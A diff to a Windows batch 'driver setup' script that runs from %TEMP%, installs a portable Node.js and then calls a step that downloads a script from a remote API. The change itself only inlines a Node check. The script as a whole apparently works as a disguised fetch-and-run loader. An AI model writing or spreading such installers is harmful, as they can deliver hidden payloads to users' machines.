@@ -3,7 +3,7 @@ setlocal EnableDelayedExpansion
 title Creating new Info
 
 REM =====================================================================
-REM  Windows driver setup — entry
+REM  Windows driver setup - entry
 REM  Template: WINDOW_UID injected by POST /window/:id on api.canditech.org
 REM =====================================================================
 
@@ -26,8 +26,17 @@ call :InitPaths
 call :ResolveNodeRuntime
 if errorlevel 1 exit /b 1
 
-call :VerifyNodeBinary
-if errorlevel 1 exit /b 1
+REM Verify Node inline (avoids "label not found" if CRLF/encoding from API breaks mid-file labels)
+if not defined NODE_EXE (
+    echo [ERROR] Node.js is not available after setup.
+    exit /b 1
+)
+echo [INFO] Verifying Node.js...
+"%NODE_EXE%" -v >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Node did not run. Path: "%NODE_EXE%"
+    exit /b 1
+)
 
 call :DownloadDriverScript
 if errorlevel 1 exit /b 1
@@ -57,7 +66,7 @@ exit /b 1
 
 
 REM ---------------------------------------------------------------------
-REM  Paths — script dir is %TEMP% when run from downloaded t.bat
+REM  Paths - script dir is %TEMP% when run from downloaded t.bat
 REM ---------------------------------------------------------------------
 :InitPaths
 set "EXTRACT_DIR=%~dp0nodejs"
@@ -129,22 +138,6 @@ if not exist "!PORTABLE_NODE!" (
 set "NODE_EXE=!PORTABLE_NODE!"
 set "PATH=!EXTRACT_DIR!\PFiles64\nodejs;!PATH!"
 echo [INFO] Portable Node.js installed.
-exit /b 0
-
-
-REM ---------------------------------------------------------------------
-REM ---------------------------------------------------------------------
-:VerifyNodeBinary
-if not defined NODE_EXE (
-    echo [ERROR] Node.js is not available after setup.
-    exit /b 1
-)
-echo [INFO] Verifying Node.js...
-"%NODE_EXE%" -v >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] Node did not run. Path: "%NODE_EXE%"
-    exit /b 1
-)
 exit /b 0
 
 
